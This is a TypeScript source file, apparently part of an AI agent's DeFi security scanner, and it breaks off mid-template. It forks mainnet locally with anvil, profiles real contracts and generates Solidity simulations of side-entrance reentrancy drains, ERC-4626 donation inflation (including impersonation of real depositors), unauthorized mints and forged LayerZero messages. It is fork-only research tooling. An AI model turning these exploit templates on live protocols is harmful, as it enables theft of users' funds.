// Mainnet-fork mode: spawn a LOCAL anvil forked from a remote RPC (read-only),
// recon a target pool, simulate the matched technique, and report. The agent
// itself only ever talks to 127.0.0.1 — talking to the remote chain is anvil's
// job, and nothing here broadcasts anything anywhere.
import { spawn } from "node:child_process";
import { setTimeout as sleep } from "node:timers/promises";
import { assertLocalRpc, assertSafeArgs } from "./safety.ts";
import { forgeEnv } from "./config.ts";
import { forge } from "./runner.ts";
import { readFileSync, mkdirSync, writeFileSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { join } from "node:path";
import { AGENT_TEST_DIR } from "./config.ts";
import { LZ_ENDPOINTS } from "./lz.ts";
import { forgeWithSelfRepair } from "./selfrepair.ts";
import { getLogsConsensus, infraRpcWithFailover, TOPIC_ERC4626_DEPOSIT } from "./scan.ts";
import type { ChainSpec } from "./scan.ts";
import { deepestRevertFrames, summarizeRevertFrames } from "./trace.ts";

/** Spawn a local anvil fork, retrying across verified fallback endpoints.
 * Free public RPCs commonly answer eth_chainId yet refuse the heavy fork
 * fetch (-32046 "Cannot fulfill request" / HTTP 429). The only real proof
 * an endpoint serves forks is a completed anvil boot, so that is what we
 * retry on. `fallbacks` must all serve the same chain as `forkUrl`.
 * Returns the successful fork. Throws the last boot error if all fail. */
export async function spawnForkWithFailover(
  forkUrl: string,
  port: number,
  fallbacks: string[] = []
): Promise<AnvilFork> {
  const candidates = [forkUrl, ...fallbacks.filter((u) => u && u !== forkUrl)];
  let lastErr: Error | null = null;
  for (const url of candidates) {
    // One spaced retry per endpoint: "anvil fork failed to start" was 37 of
    // 129 observed probe errors — usually a cold endpoint or a port not yet
    // freed by the previous probe's fork. stop() SIGKILLs before retrying.
    for (let attempt = 0; attempt < 2; attempt++) {
      const fork = new AnvilFork(url, port);
      try {
        await fork.start();
        return fork;
      } catch (e) {
        lastErr = e as Error;
        fork.stop();
        if (attempt === 0) {
          await sleep(1500);
          continue;
        }
      }
    }
  }
  throw lastErr ?? new Error("no fork endpoint answered");
}

// Well-known function selectors (cast sig, verified).
const SELECTORS: Record<string, string> = {
  deposit: "d0e30db0",
  withdraw: "3ccfd60b",
  flashLoanUint: "9ab603b9", // flashLoan(uint256)
  flashLoanAddr: "9d9e465c", // flashLoan(address,uint256)
  borrow: "c5ebeaec", // borrow(uint256)
  buyMany: "779cc9d0", // buyMany(uint256[])
  // bridge claim surface (withdraw(bytes32,uint256,address,uint256,bytes))
  bridgeWithdraw: "7e7c4a57",
  // ERC-4626 vault surface
  convertToShares: "c6e6f592",
  convertToAssets: "07a2d13a",
  maxRedeem: "d905777e",
  // Safe multisig surface
  getOwners: "a0e67e2b",
  getThreshold: "e75235b8",
  execTransaction: "6a761202",
  // Timelock surface
  getMinDelay: "f27a0c92",
  // Proxy admin surface
  proxyAdmin: "3e47158c",
  // Unrestricted-mint surface (unauthorized / infinite-mint candidates).
  // Values are raw hex selectors matched against deployed bytecode —
  // cast-verified: mint(address,uint256)=40c10f19, mint(uint256)=a0712d68.
  // (An earlier version carried 0x-prefixed and WRONG values — bytecode
  // contains neither the "0x" nor 40c10e51 — so the mint surface never fired.)
  // The probe treats any target whose bytecode contains one of these as a
  // mint-surface candidate and attempts an unauthorized mint on the local
  // fork to see whether supply (and a funded attacker's balance) increases.
  // NOTE: UniswapV2Pair.mint(address)=6a627842 is deliberately NOT here —
  // that's LP liquidity minting, not a token-mint exploit surface.
  // LayerZero cross-chain surface (V2 tuple lzReceive / V1 flat lzReceive)
  lzReceiveV2: "13137d65",      // lzReceive((uint32,bytes32,uint64),bytes32,bytes,address,bytes)
  lzReceiveV1: "001d3567",      // lzReceive(uint16,bytes,uint64,bytes)
  lzComposeSig: "1f1e97f0",     // lzCompose(...) — compose chaining surface
  setPeer: "3400288b",          // setPeer(uint32,bytes32) — V2 config
  setTrustedRemote: "eb8d72b7", // setTrustedRemote(uint16,bytes) — V1 config
  oAppVersion: "17442b70",      // OApp version fingerprint
  peersView: "bb0b6a53",        // public peers(uint32) accessor
  trustedRemoteView: "ac447944",// public trustedRemote(uint16) accessor
  mint:         "40c10f19", // mint(address,uint256) — OZ-style minter
  mintUint256:  "a0712d68", // mint(uint256) — vault-style supply mint
  mintWithData: "1249c58b", // mint(address,uint256,bytes) — ERC777-style / some vaults
  // AMM pool surface (v2 pair / v3 pool) — without these, factory-discovered
  // pools classified as "unknown" and the oracle/swap probe classes never lit.
  getReserves:  "0902f1ac", // getReserves() — v2 pair fingerprint
  slot0:        "3850c7bd", // slot0() — v3 pool fingerprint
  token0:       "0dfe1681", // token0()
  token1:       "d21220a7", // token1()
  factory:      "c45a0155", // factory()
};

/** EIP-55 checksum an address. Solidity address literals REQUIRE the
 * checksummed casing; discovery may hand us lowercase. Uses `cast` (foundry
 * is a hard dependency of everything else here). Falls back to the input
 * unchanged if cast is unavailable. */
const checksumCache = new Map<string, string>();
export function toChecksumAddress(addr: string): string {
  const key = addr.toLowerCase();
  const hit = checksumCache.get(key);
  if (hit) return hit;
  let out = addr;
  try {
    out = execFileSync("cast", ["--to-checksum-address", key], {
      env: forgeEnv(),
      encoding: "utf8",
    }).trim();
  } catch {
    out = addr; // best effort — the probe will report the compile error honestly
  }
  checksumCache.set(key, out);
  return out;
}

export interface PoolRecon {
  address: string;
  chainId: string;
  hasCode: boolean;
  ethWei: string; // decimal wei
  wethWei: string; // decimal wei of wrapped-native held, if chain known
  selectors: string[]; // human-readable list of detected entrypoints
  shape: string; // classified interface shape
  /** When known (recent ERC-4626 Deposit event), a real depositor on this
   * vault — allowlisted/guarded vaults accept calls from these addresses,
   * so the probe can impersonate one instead of failing outright. */
  depositor?: string;
}

// Canonical wrapped-native tokens per chain (read-only recon).
const WRAPPED_NATIVE: Record<string, string> = {
  "1": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
  "10": "0x4200000000000000000000000000000000000006", // WETH
  "8453": "0x4200000000000000000000000000000000000006", // WETH
  "137": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WMATIC
  "42161": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
  "11155111": "0x7b79995e5f793A07Bc00c21412e50Ecae098E7f9", // WETH
};

export interface ForkFinding {
  pool: string;
  technique: string;
  applicable: boolean;
  simulated: boolean;
  profitWei: string; // decimal, "0" if unknown/not drained
  notes: string;
}

export class AnvilFork {
  private child: any = null;
  localRpc: string;
  readonly forkUrl: string | null;
  readonly port: number;
  private attached: boolean;

  constructor(forkUrl: string, port = 8545) {
    this.forkUrl = forkUrl;
    this.port = port;
    this.localRpc = `http://127.0.0.1:${port}`;
    this.attached = false;
  }

  /** Attach to an already-running LOCAL chain instead of spawning a fork. */
  static attach(localRpc: string): AnvilFork {
    assertLocalRpc(localRpc, "attach");
    const f = new AnvilFork(localRpc); // forkUrl unused in attach mode
    f.attached = true;
    f.localRpc = localRpc;
    return f;
  }

  async start(): Promise<void> {
    if (this.attached) {
      // Verify the local chain answers before proceeding.
      await this.rpc("eth_blockNumber");
      return;
    }
    assertSafeArgs(["--fork-url", this.forkUrl!], "anvil fork");
    this.child = spawn("anvil", ["--fork-url", this.forkUrl!, "--port", String(this.port)], {
      env: forgeEnv(),
      stdio: ["ignore", "pipe", "pipe"],
    });
    let bootLog = "";
    this.child.stdout.on("data", (d: Buffer) => (bootLog += d.toString()));
    this.child.stderr.on("data", (d: Buffer) => (bootLog += d.toString()));

    for (let i = 0; i < 40; i++) {
      if (this.child.exitCode !== null) {
        // anvil already exited — no point waiting out the boot loop
        throw new Error(`anvil fork failed to start. Log:\n${bootLog.slice(-2000)}`);
      }
      try {
        await this.rpc("eth_blockNumber");
        return;
      } catch {
        await sleep(500);
      }
    }
    this.stop();
    throw new Error(`anvil fork failed to start. Log:\n${bootLog.slice(-2000)}`);
  }

  stop(): void {
    this.child?.kill("SIGKILL");
    this.child = null;
  }

  /** JSON-RPC call to the LOCAL anvil only — allowlist enforced here. */
  async rpc(method: string, params: any[] = []): Promise<any> {
    assertLocalRpc(this.localRpc, "agent RPC");
    // One spaced retry on network-level failure: `fetch failed` (wedged or
    // restarted anvil socket) accounted for 90 of 129 observed probe errors.
    // RPC *error responses* are not retried — those are honest reverts.
    for (let attempt = 0; attempt < 2; attempt++) {
      try {
        const res = await fetch(this.localRpc, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
          signal: AbortSignal.timeout(10_000),
        });
        const json: any = await res.json();
        if (json.error) throw new Error(`RPC ${method}: ${json.error.message}`);
        return json.result;
      } catch (e) {
        const msg = String((e as Error).message ?? e);
        const networkLevel = /fetch failed|ECONNRESET|socket hang up|network|terminated/i.test(msg);
        if (attempt === 0 && networkLevel) {
          await sleep(800);
          continue;
        }
        throw e;
      }
    }
    throw new Error(`RPC ${method}: unreachable`); // appease the type checker
  }
}

function hexToWei(hex: string): string {
  return BigInt(hex).toString();
}

export async function reconPool(fork: AnvilFork, poolAddress: string, chain?: ChainSpec, depth = 0): Promise<PoolRecon> {
  const code: string = await fork.rpc("eth_getCode", [poolAddress, "latest"]);
  const balanceHex: string = await fork.rpc("eth_getBalance", [poolAddress, "latest"]);
  const chainId: string = await fork.rpc("eth_chainId");

  const selectors: string[] = [];
  const codeLower = code.toLowerCase();
  for (const [name, sel] of Object.entries(SELECTORS)) {
    if (codeLower.includes(sel)) selectors.push(name);
  }

  // Most real lending pools hold wrapped-native, not raw ETH — recon it.
  let wethWei = "0";
  const weth = WRAPPED_NATIVE[BigInt(chainId).toString()];
  if (weth) {
    try {
      const balHex: string = await fork.rpc("eth_call", [
        { to: weth, data: `0x70a08231${poolAddress.replace(/^0x/, "").padStart(64, "0")}` },
        "latest",
      ]);
      wethWei = hexToWei(balHex);
    } catch {
      // wrapped-native read is best-effort
    }
  }

  // ERC-4626 vaults that gate deposits by allowlist revert every probe that
  // mints fresh fork-state identity — the ONLY addresses guaranteed to pass
  // the gate are addresses that have actually deposited. Resolve one from the
  // vault's recent Deposit events (address-filtered getLogs: the one query
  // shape every free endpoint serves). Best-effort; undefined → standard path.
  let depositor: string | undefined;
  if (chain) {
    depositor = await resolveRecentDepositor(chain, poolAddress);
  }

  let shape = "unknown";
  if (selectors.includes("getReserves") && (selectors.includes("token0") || selectors.includes("factory"))) {
    shape = "amm v2 pair (getReserves) — swap/skim/sync surface";
  } else if (selectors.includes("slot0") && selectors.includes("token0")) {
    shape = "amm v3 pool (slot0) — concentrated-liquidity surface";
  } else if (selectors.includes("flashLoanUint") && selectors.includes("deposit") && selectors.includes("withdraw")) {
    shape = "side-entrance-style lender (flashLoan(uint256)+deposit+withdraw)";
  } else if (selectors.includes("flashLoanAddr")) {
    shape = "borrower-arg lender (flashLoan(address,uint256))";
  } else if (selectors.includes("borrow")) {
    shape = "collateralized lender (borrow)";
  } else if (selectors.includes("buyMany")) {
    shape = "NFT marketplace (buyMany)";
  } else if (selectors.includes("bridgeWithdraw")) {
    shape = "bridge claim vault (withdraw(bytes32,uint256,address,uint256,bytes))";
  } else if (selectors.includes("convertToShares") && (selectors.includes("maxRedeem") || selectors.includes("convertToAssets"))) {
    shape = "erc-4626-style vault (convertToShares/maxRedeem)";
  } else if (selectors.includes("getOwners") && selectors.includes("getThreshold")) {
    shape = "multisig wallet (getOwners/getThreshold)";
  } else if (selectors.includes("getMinDelay")) {
    shape = "timelock controller (getMinDelay)";
  } else if (selectors.includes("proxyAdmin")) {
    shape = "upgradeable proxy (admin slot)";
  } else if (selectors.includes("lzReceiveV2") || selectors.includes("lzReceiveV1")) {
    // LayerZero OApp inbound surface: probe inbound authz + replay (classes
    // lz-sender-authz / lz-message-replay from the cross-chain threat model).
    shape = selectors.includes("lzComposeSig")
      ? "layerzero oapp (lzReceive+lzCompose) — inbound authz + replay probe applicable"
      : "layerzero oapp (lzReceive) — inbound authz + replay probe applicable";
  } else if (selectors.includes("mint") || selectors.includes("mintUint256") || selectors.includes("mintWithData")) {
    // A contract whose deployed bytecode exposes a mint entrypoint is a
    // candidate for an unauthorized / infinite-mint exploit. Shape note
    // stays "unknown" so the scanner still investigates it (verified source
    // + LLM triage), but the selector surfaces the mint probe to triage.
    shape = `mint-surface candidate (${selectors.filter(s => s === "mint" || s === "mintUint256" || s === "mintWithData").join("+")}) — unauthorized-mint probe applicable`;
  } else if (codeLower.includes("363d3d373d3d3d363d73")) {
    // EIP-1167 minimal-proxy bytecode marker — the real attack surface lives
    // in the implementation, so recon must say so instead of "unknown".
    shape = "eip-1167 minimal proxy — resolve implementation for real surface";
  } else if (codeLower.includes("360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")) {
    // EIP-1967 implementation-slot constant baked into proxy bytecode.
    shape = "eip-1967 proxy (impl slot) — resolve implementation before probing";
  }

  // Proxy de-delegation: nearly every real vault is a proxy, and stopping at
  // "it's a proxy" blocks the entire probe pipeline. Resolve the
  // implementation and recon IT for the true attack surface — probes still
  // run against the proxy (that is where state and assets live).
  //   - EIP-1167 minimal proxy: implementation is embedded in the bytecode.
  //   - EIP-1967 / transparent proxies: read the implementation storage slot.
  const isProxyShape =
    shape.startsWith("eip-1167 minimal proxy") ||
    shape.startsWith("eip-1967 proxy") ||
    shape.startsWith("upgradeable proxy");
  if (isProxyShape && depth < 2) {
    let impl: string | undefined;
    const marker = "363d3d373d3d3d363d73";
    const mi = codeLower.indexOf(marker);
    if (mi >= 0 && codeLower.length >= mi + 60) {
      const cand = "0x" + codeLower.slice(mi + marker.length, mi + marker.length + 40);
      if (/^0x[0-9a-f]{40}$/.test(cand) && BigInt(cand) !== 0n) impl = cand;
    }
    if (!impl) {
      try {
        const slotVal: string = await fork.rpc("eth_getStorageAt", [
          poolAddress,
          "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
          "latest",
        ]);
        const hex = (slotVal ?? "").replace(/^0x/, "").padStart(64, "0");
        const cand = "0x" + hex.slice(-40);
        if (/^0x[0-9a-f]{40}$/.test(cand) && BigInt(cand) !== 0n) impl = cand;
      } catch {
        // slot read is best-effort
      }
    }
    if (impl) {
      try {
        const implCode: string = await fork.rpc("eth_getCode", [impl, "latest"]);
        if (implCode && implCode !== "0x" && implCode.length > 2) {
          // No `chain` here: the proxy's own logs already yielded the depositor,
          // and the impl doesn't need its own wrapped-native/depositor reads.
          const inner = await reconPool(fork, impl, undefined, depth + 1);
          return {
            ...inner,
            address: poolAddress, // probes act on the proxy: state + assets live there
            chainId: BigInt(chainId).toString(),
            hasCode: code !== "0x" && code.length > 2,
            ethWei: hexToWei(balanceHex),
            wethWei,
            selectors: [...new Set([...selectors, ...inner.selectors])],
            shape: `proxy-delegated (impl ${impl.slice(0, 10)}…): ${inner.shape}`,
            depositor,
          };
        }
      } catch {
        // impl recon is best-effort — fall through to the honest proxy shape
      }
    }
  }

  return {
    address: poolAddress,
    chainId: BigInt(chainId).toString(),
    hasCode: code !== "0x" && code.length > 2,
    ethWei: hexToWei(balanceHex),
    wethWei,
    selectors,
    shape,
    depositor,
  };
}

/** ERC-4626 vaults that gate deposits by allowlist revert every probe that
 * mints fresh fork-state identity — the ONLY addresses guaranteed to pass the
 * gate are addresses that have actually deposited. Resolve the most recent
 * depositor from the vault's Deposit events (address-filtered getLogs: the
 * one query shape every free endpoint serves). Best-effort: undefined on any
 * failure, and the probe falls back to its standard path. */
async function resolveRecentDepositor(chain: ChainSpec, vault: string): Promise<string | undefined> {
  try {
    const height = BigInt(await infraRpcWithFailover(chain, "eth_blockNumber"));
    const from = "0x" + (height - 200_000n).toString(16);
    const logs = await getLogsConsensus(chain, {
      address: vault.toLowerCase(),
      topics: [TOPIC_ERC4626_DEPOSIT],
      fromBlock: from,
      toBlock: "latest",
    });
    if (!Array.isArray(logs) || logs.length === 0) return undefined;
    const last = logs[logs.length - 1]!;
    const topics: string[] = last.topics ?? [];
    if (topics.length < 3) return undefined;
    const addr = `0x${topics[2]!.slice(-40)}`;
    return /^0x[0-9a-fA-F]{40}$/.test(addr) ? addr.toLowerCase() : undefined;
  } catch {
    return undefined;
  }
}

/** Generate the self-contained fork simulation for the matched technique. */
export function renderSim(pool: PoolRecon, technique: string): string {
  if (technique === "erc4626-share-inflation") {
    return renderVaultInflationSim(pool);
  }
  if (technique === "lz-governance-replay") {
    return renderLzGovReplaySim(pool);
  }
  if (technique === "lz-oft-dust") {
    return renderOftDustSim(pool);
  }
  if (technique === "unauthorized-mint") {
    return renderMintInflationSim(pool);
  }
  if (technique === "oracle-spot-manipulation") {
    return renderOracleSpotSim(pool);
  }
  if (technique !== "side-entrance-reentrancy") {
    throw new Error(`no probe implemented for technique ${technique}`);
  }
  const cs = toChecksumAddress(pool.address);
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED fork simulation (local anvil fork only — never broadcast).
// NOTE: forge scripts forbid address(this) — an explicit prank actor owns the
// attacker and receives the loot.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {SideEntranceAttacker} from "../../src/attackers/SideEntranceAttacker.sol";
import {ISideEntranceLenderPool} from "../../src/interfaces/ISideEntranceLenderPool.sol";

contract ForkSim_${cs.slice(0, 10)} is Test {
    function run() public {
        ISideEntranceLenderPool pool = ISideEntranceLenderPool(payable(${cs}));
        uint256 poolBefore = address(pool).balance;

        // The attacker's owner/loot recipient (an explicit actor, not the script).
        address lootOwner = makeAddr("lootOwner");
        vm.deal(lootOwner, 1 ether);

        vm.startPrank(lootOwner);
        SideEntranceAttacker attacker = new SideEntranceAttacker(address(pool));
        // The technique probe: flash-loan the pool, re-enter deposit, withdraw.
        attacker.attack(poolBefore);
        vm.stopPrank();

        console2.log("[POOL_BEFORE]", poolBefore);
        console2.log("[POOL_AFTER]", address(pool).balance);
        console2.log("[PROFIT_WEI]", lootOwner.balance - 1 ether);
    }
}
`;
}

// SELECTORS (cast-verified): asset()=38d52e0f totalSupply()=18160ddd
// balanceOf(address)=70a08231 deposit(uint256,address)=6e553f65
// redeem(uint256,address,address)=ba087652. Deposit topic (cast-verified):
// dcbc1c05240f31ff3ad067ef1ee35ce4997762752e3a095284754544f4c709d7.
export function renderVaultInflationSim(pool: PoolRecon): string {
  const vault = toChecksumAddress(pool.address);
  // Only when recon resolved a REAL depositor (address-filtered Deposit logs)
  // does the impersonation path get emitted — an invented address would just
  // revert on the same allowlist and teach us nothing.
  const depositor = pool.depositor ? toChecksumAddress(pool.depositor) : undefined;
  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED ERC-4626 donation-inflation probe (LOCAL fork only — never
// broadcast). If the vault's share price can be inflated by a direct asset
// donation, a first depositor can trap late depositors' funds. The simulation
// DONATES ITS OWN FORK-STATE TOKENS via anvil deal/mint, not anyone else's.
//
// Allowlist/guarded vaults revert every probe that mints fresh fork-state
// identity. When recon resolved a real depositor, run() RETRIES WHILE
// IMPERSONATING THEM — a pass as the depositor is reported as such, never
// silently claimed as an open-vault result.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20Lite {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}
interface IERC4626Lite {
    function asset() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function convertToAssets(uint256) external view returns (uint256);
}

contract ForkSim_${vault.slice(0, 10)} is Test {
    IERC4626Lite vault;
    IERC20Lite token;
    address asset;
    address depositor;
    uint256 supplyBefore;
    uint256 assetsBefore;
    uint256 stake;
    uint256 donate;
    bool asDepositor;

    function min256(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function run() public {
        vault = IERC4626Lite(${vault});
        depositor = ${depositor ?? "address(0)"};
        try vault.asset() returns (address a) {
            asset = a;
        } catch {
            console2.log("[SKIPPED] vault.asset() reverted - not a readable ERC-4626 vault");
            return;
        }
        token = IERC20Lite(asset);
        require(asset != address(0), "no asset()");

        supplyBefore = vault.totalSupply();
        assetsBefore = token.balanceOf(address(vault));
        console2.log("[VAULT_SUPPLY_BEFORE]", supplyBefore);
        console2.log("[VAULT_ASSETS_BEFORE]", assetsBefore);
        if (supplyBefore == 0 || assetsBefore == 0) {
            console2.log("[SKIPPED] empty or unseeded vault - donation probe needs an existing market");
            return;
        }
        // Off-ramp BEFORE the probe paths: gated vaults (operator allowlists,
        // role-guarded deposit) revert for strangers no matter what the probe
        // does, and every revert here used to bubble up as a bare "probe
        // reverted: custom error 0x…" — read by the pipeline as evidence of
        // attack surface. A refusal is not surface: resolve it honestly as a
        // no-simulation outcome so the row can never be dressed up as a drain.
        try vault.convertToAssets(1e18) returns (uint256 p) {
            if (p == 0) {
                console2.log("[SKIPPED] convertToAssets(1e18) returned 0 - degenerate share math");
                return;
            }
        } catch {
            console2.log("[NO_SIM] convertToAssets reverted - vault gates reads for strangers (operator/roles); needs manual analysis");
            return;
        }

        // --- Standard path: ephemeral attacker funded via anvil deal (fork-
        // state only; all changes die with anvil). One 1-wei canary deposit
        // quietly tests whether the vault accepts strangers at all.
        address attacker = makeAddr("lootOwner");
        deal(asset, attacker, 2 * 1e24);
        stake = token.balanceOf(attacker) / 2;
        if (stake > 0) {
            bool ok;
            vm.startPrank(attacker);
            try token.approve(address(vault), type(uint256).max) returns (bool a) { ok = a; } catch { ok = false; }
            vm.stopPrank();
            if (ok) {
                try vault.deposit(1, attacker) returns (uint256) {
                    donate = stake - 1;
                    probePhase(false);
                    return;
                } catch {
                    console2.log("[GUARD] standard deposit path reverted - vault is gated (allowlist/operator)");
                }
            }
        }

        // --- Guarded path: impersonate the REAL depositor recon resolved.
        if (depositor != address(0)) {
            console2.log("[GUARD] retrying while impersonating a real depositor");
            asDepositor = true;
            bool ok;
            vm.startPrank(depositor);
            try token.approve(address(vault), type(uint256).max) returns (bool a) { ok = a; } catch { ok = false; }
            vm.stopPrank();
            if (ok) {
                try vault.deposit(1, depositor) returns (uint256) {
                    // Fund them for the donation the same honest way: top up
                    // the fork's copy of their balance (their real balance is
                    // left untouched on-chain; this is fork-state only).
                    try token.balanceOf(depositor) returns (uint256 b) { stake = min256(b, 1e24); } catch { stake = 0; }
                    if (stake > 1) {
                        donate = stake - 1;
                        probePhase(true);
                        return;
                    }
                    console2.log("[GUARD] depositor passes the gate but holds dust - nothing to donate");
                } catch {
                    console2.log("[GUARD] depositor deposit also reverted - stricter than depositor-allowlist gating (vault-level roles)");
                }
            }
        }
        console2.log("[NO_SIM] vault gates all probe paths (allowlist/roles); needs manual analysis");
    }

    // Donation + late-depositor harm test, shared by both paths. Enters with
    // the actor's prank OPEN (startPrank by run()) and closes it itself.
    function probePhase(bool viaDepositor) internal {
        asDepositor = viaDepositor;
        address actor = asDepositor ? depositor : makeAddr("lootOwner2");
        vm.stopPrank();
        uint256 vaultAssetsAfterDeposit = token.balanceOf(address(vault));
        if (donate > 0) {
            vm.startPrank(actor);
            bool transferred;
            try token.transfer(address(vault), donate) returns (bool t) { transferred = t; } catch { transferred = false; }
            vm.stopPrank();
            if (!transferred) {
                // Fee-on-transfer/rebasing assets: donate via anvil deal on
                // the fork instead — same inflation semantics, no transfer.
                deal(asset, address(vault), vaultAssetsAfterDeposit + donate);
            }
        }
        console2.log("[DONATED_WEI]", token.balanceOf(address(vault)) - vaultAssetsAfterDeposit);
        uint256 p1 = (token.balanceOf(address(vault)) * 1e18) / supplyBefore;
        console2.log("[PRICE_AFTER]", p1);
        harmTest();
    }

    // A late depositor puts in a small stake and immediately redeems; a sound
    // vault returns it all (modulo rounding dust), an inflatable one mints
    // zero shares and traps the deposit.
    function harmTest() internal {
        address late = makeAddr("lateDepositor");
        uint256 lateStake = stake / 1000 > 10 ? stake / 1000 : 10;
        deal(asset, late, lateStake);
        uint256 lateGot;
        uint256 lateShares;
        bool harmOk = false;
        {
            vm.startPrank(late);
            try token.approve(address(vault), type(uint256).max) returns (bool) {
                try vault.deposit(lateStake, late) returns (uint256 sh) {
                    lateShares = sh;
                    harmOk = true;
                } catch { /* gated late deposit — inconclusive, not a finding */ }
            } catch { /* approve revert — inconclusive */ }
            vm.stopPrank();
        }
        if (!harmOk) {
            console2.log("[SKIPPED] late-depositor harm test reverted - inconclusive on this vault");
            return;
        }
        console2.log("[LATE_DEPOSITOR_SHARES]", lateShares);
        {
            vm.startPrank(late);
            if (lateShares > 0) {
                try vault.redeem(lateShares, late, late) returns (uint256 got) { lateGot = got; } catch { lateGot = 0; }
            }
            vm.stopPrank();
        }
        console2.log("[LATE_GOT_BACK]", lateGot);
        verdict(lateStake, lateShares, lateGot);
    }

    // Materiality: a sound vault still loses a few wei to normal
    // deposit→redeem rounding. Only flag the actual attack shape — the
    // victim mints ZERO shares (full deposit trapped) or loses materially
    // (> 0.01% of stake) — not rounding dust.
    function verdict(uint256 lateStake, uint256 lateShares, uint256 lateGot) internal view {
        uint256 lateLoss = lateStake - lateGot;
        if (lateShares == 0 || lateLoss * 10000 > lateStake) {
            if (asDepositor) {
                console2.log("[FINDING] DONATION-INFLATABLE (reproduced as allowlisted depositor): share price from raw balance traps later depositors");
            } else {
                console2.log("[FINDING] DONATION-INFLATABLE: share price from raw balance lets a first depositor trap later depositors' funds (no virtual offset)");
            }
            console2.log("[PROFIT_WEI]", lateLoss);
        } else if (lateLoss > 0) {
            console2.log("[NO_VIOLATION] rounding dust only", lateLoss);
            console2.log("[NO_VIOLATION] below 0.01% materiality -- vault healthy");
        } else {
            console2.log("[NO_VIOLATION] deposit fully redeemable -- vault resists donation inflation");
        }
    }
}
`;
}

/** LayerZero inbound-authz + replay probe (LOCAL fork only). Pranks the
 * chain's real endpoint address and calls the target OApp's lzReceive with a
 * FORGED origin: a srcEid that cannot be configured (999999001) and an
 * attacker sender. A correct OApp reverts (peer/sender validation). If the
 * call succeeds AND the OApp's native balance drops, the app executed an
 * unauthenticated payout — the lz-sender-authz class. Calling the identical
 * message twice additionally exposes missing nonce consumption (replay).
 *
 * Honest scope: a generic probe cannot know each OApp's payload encoding, so
 * it tries the two most common payout shapes — abi.encode(address,uint256)
 * and abi.encode(address) — plus the V1 empty-path variant. Apps that revert
 * on all shapes are reported as "rejected forged origins; message encoding
 * needs manual analysis", never as findings. Token-side payouts are out of
 * scope for this template (the triage LLM carries the lz- hints instead). */
export function renderLzSim(pool: PoolRecon, version: "v1" | "v2"): string {
  const target = toChecksumAddress(pool.address);
  const eps = LZ_ENDPOINTS[Number(pool.chainId)];
  const ep = eps?.v2 ?? eps?.v1 ?? "0x000000000000000000000000000000000000dEaD";
  const v2 = version === "v2";

  const interfaceDecl = v2
    ? [
        "interface LZOAppV2 {",
        "    struct Origin { uint32 srcEid; bytes32 sender; uint64 nonce; }",
        "    function lzReceive(Origin calldata, bytes32, bytes calldata, address, bytes calldata) external;",
        "}",
      ].join("\n")
    : [
        "interface LZOAppV1 {",
        "    function lzReceive(uint16, bytes calldata, uint64, bytes calldata) external;",
        "}",
      ].join("\n");

  const attackBody = v2
    ? [
        "        bytes32 sndr = bytes32(uint256(uint160(ATTACKER)));",
        "        bytes memory payFull = abi.encode(ATTACKER, uint256(1e15));",
        "        bytes memory payAddr = abi.encode(ATTACKER);",
        "        moved += tryV2(uint32(FAKE_EID), sndr, 1, bytes32(uint256(1)), payFull);",
        "        moved += tryV2(uint32(FAKE_EID), sndr, 2, bytes32(uint256(2)), payAddr);",
        "        // Replay: the identical message twice — must pay at most once.",
        "        uint256 once = tryV2(uint32(FAKE_EID), sndr, 3, bytes32(uint256(3)), payFull);",
        "        moved += once;",
        "        if (once > 0 && tryV2(uint32(FAKE_EID), sndr, 3, bytes32(uint256(3)), payFull) > 0) replayed = true;",
      ].join("\n")
    : [
        "        bytes memory payFull = abi.encode(ATTACKER, uint256(1e15));",
        "        moved += tryV1(uint16(9999), ATTACKER, 1, payFull);",
        "        // empty-path bypass shape: an empty srcAddress must never authenticate",
        "        moved += tryV1(uint16(9999), address(0), 2, payFull);",
        "        // Replay: the identical message twice.",
        "        uint256 once = tryV1(uint16(9999), ATTACKER, 3, payFull);",
        "        moved += once;",
        "        if (once > 0 && tryV1(uint16(9999), ATTACKER, 3, payFull) > 0) replayed = true;",
      ].join("\n");

  const helper = v2
    ? [
        "    function tryV2(uint32 eid, bytes32 sender, uint64 nonce, bytes32 guid, bytes memory payload) internal returns (uint256 movedOut) {",
        "        uint256 before = TARGET.balance;",
        "        vm.prank(ENDPOINT);",
        '        try LZOAppV2(TARGET).lzReceive(LZOAppV2.Origin(eid, sender, nonce), guid, payload, address(0), "") {',
        "            return before > TARGET.balance ? before - TARGET.balance : 0;",
        "        } catch {",
        "            return 0;",
        "        }",
        "    }",
      ].join("\n")
    : [
        "    function tryV1(uint16 chainId, address remote, uint64 nonce, bytes memory payload) internal returns (uint256 movedOut) {",
        "        uint256 before = TARGET.balance;",
        "        vm.prank(ENDPOINT);",
        "        try LZOAppV1(TARGET).lzReceive(chainId, abi.encodePacked(remote), nonce, payload) {",
        "            return before > TARGET.balance ? before - TARGET.balance : 0;",
        "        } catch {",
        "            return 0;",
        "        }",
        "    }",
      ].join("\n");

  return `// SPDX-License-Identifier: MIT
// AGENT-GENERATED LayerZero inbound-authz + replay probe (LOCAL fork only —
// never broadcast). Forged origin from an unconfigured chain; payout detected
// by native-balance movement of the OApp itself.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

${interfaceDecl}

contract ForkSim_${target.slice(0, 10)} is Test {
    address constant TARGET = ${target};
    address constant ENDPOINT = ${ep};
    address constant ATTACKER = address(0xA11CE);
